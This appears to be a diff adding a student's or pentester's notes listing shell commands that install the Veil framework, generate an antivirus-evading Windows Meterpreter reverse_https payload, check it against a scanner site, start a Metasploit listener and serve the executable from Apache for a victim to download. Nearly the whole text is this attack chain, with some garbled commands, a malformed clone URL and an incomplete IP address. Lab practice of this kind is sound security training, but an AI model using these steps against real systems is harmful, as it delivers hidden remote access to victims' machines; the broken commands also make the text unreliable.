@@ -1,0 +1,50 @@
+cd /opt
+ls
+git clone https:github.com/veil.framework/veil.git
+ls
+cd veil
+cd config/
+ls
+./setup.sh --silent --force
+
+#in new terminal
+pwd
+cd /opt/veil
+ls
+./veil.py
+
+list
+use 1
+list
+use 15
+set LHOST myip
+set LPORT 8080
+options
+set PROCESSORS 1
+set sleep 6
+options
+generate
+rev_htttps_8080
+
+#copy where the executable is written to
+#open no distribute in chrome
+
+#listening for incoming connections
+#new terminal
+msfconsole
+use exploit/multihandler
+show options
+set PAYLOAD windows/meterpreter/reverse_https
+show options
+set LHOST 10.20.14
+set LPORT 8080
+show options
+exploit
+
+#go to /var/lib/veil-evasion/output/compiled/
+copy paste it to evil files
+
+#newterminal service apache2 start
+
+in victim machine type my ip in browser
+i.e 10.20.14.213/evil-files/
